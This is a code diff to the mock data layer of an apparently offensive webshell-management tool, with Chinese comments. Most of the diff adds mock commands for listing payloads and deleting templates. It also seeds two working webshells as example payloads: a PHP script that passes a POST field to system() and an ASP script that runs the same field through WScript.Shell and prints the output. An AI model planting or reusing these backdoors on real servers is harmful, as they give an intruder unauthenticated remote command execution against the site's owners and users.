@@ -101,10 +101,56 @@ export type UnlistenFn = () => void
  * 模拟的内存数据存储
  * 用于在会话期间保存创建的数据
  */
-const mockStore = {
+export const mockStore = {
   projects: [] as Project[],
   webshells: [] as WebShell[],
-  payloads: [] as any[],
+  payloads: [
+    // 预置一些示例 Payload 数据
+    {
+      id: 1,
+      name: 'example_php_basic.php',
+      type: 'php',
+      function: 'basic',
+      encoder: 'none',
+      obfuscationLevel: 'low',
+      createdAt: new Date().toISOString(),
+      size: 512,
+      content: `<?php
+// Example PHP Payload by FG-ABYSS
+@error_reporting(0);
+@set_time_limit(0);
+
+if (isset($_POST['password'])) {
+    $cmd = $_POST['password'];
+    echo "<pre>";
+    system($cmd);
+    echo "</pre>";
+}
+?>`
+    },
+    {
+      id: 2,
+      name: 'example_asp_basic.asp',
+      type: 'asp',
+      function: 'basic',
+      encoder: 'none',
+      obfuscationLevel: 'low',
+      createdAt: new Date().toISOString(),
+      size: 380,
+      content: `<%
+' Example ASP Payload by FG-ABYSS
+Dim cmd
+cmd = Request.Form("password")
+If cmd <> "" Then
+    Dim shell
+    Set shell = Server.CreateObject("WScript.Shell")
+    Dim exec
+    Set exec = shell.Exec(cmd)
+    Response.Write "<pre>" & exec.StdOut.ReadAll() & "</pre>"
+End If
+%>`
+    }
+  ] as any[],
   templates: [] as TemplateInfo[],
   settings: new Map<string, any>(),
   systemStatus: {
@@ -323,8 +369,8 @@ export async function invoke(command: string, args?: any): Promise<any> {
     
     case 'generate_payload':
       const payloadReq = args as GeneratePayloadRequest
-      if (!payloadReq?.type || !payloadReq?.password) {
-        throw new Error('缺少必要参数')
+      if (!payloadReq?.type) {
+        throw new Error('缺少脚本类型参数')
       }
       
       // 生成模拟的 Payload 内容
@@ -343,13 +389,23 @@ export async function invoke(command: string, args?: any): Promise<any> {
         id: mockStore.payloads.length + 1,
         name: filename,
         type: payloadReq.type,
-        function: payloadReq.function,
+        function: payloadReq.function || 'basic',
+        encoder: payloadReq.encoder || 'none',
+        obfuscationLevel: payloadReq.obfuscation_level || 'low',
         createdAt: new Date().toISOString(),
         size: mockContent.length,
         content: mockContent
       })
       
       return payloadResponse
+    
+    case 'get_payloads':
+      // 返回已生成的 Payload 列表
+      return {
+        success: true,
+        payloads: mockStore.payloads,
+        total: mockStore.payloads.length
+      }
     
     case 'get_templates':
       return mockStore.templates
@@ -372,6 +428,10 @@ export async function invoke(command: string, args?: any): Promise<any> {
         return { success: true }
       }
       throw new Error('模板不存在')
+    
+    case 'delete_all_templates':
+      mockStore.templates = []
+      return { success: true }
     
     // ==================== 设置相关命令 ====================
     
